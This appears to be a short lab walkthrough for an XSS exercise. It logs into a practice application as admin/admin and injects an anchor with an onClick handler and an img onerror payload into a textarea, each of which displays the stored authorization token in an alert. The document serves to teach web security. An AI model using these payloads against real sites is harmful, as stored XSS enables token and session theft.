# 02 XSS Exercise with JavaScript

## Steps:

- Log into the application using as user _admin_ and password _admin_.
- Once logged in we have received our token for the headers. And now let's see how to subtract them.
- We insert this anchor in the textearea and send the request to the server.

```javascript
<a onClick="alert('Gracias por su token de autorización: '+window.authHeader)">
  Click aquí para ver tu biografía
</a>
```

- It will generate a paragraph below the textarea and tell us to click on it to see our entered biography.

```
Click aquí para ver tu biografía
```

- And if we click on it we will get an alert saying:

```
Gracias por su token de autorización: <here is your token>
```

- Another way to obtain the token would be to introduce in the textarea an image as we did in the previous example. And when it gives an error because it has not been able to obtain the image, an alert pops up and we get the token.

```
<img src='x' onerror='alert("Gracias por su token de autorización: "+window.authHeader)'>
```
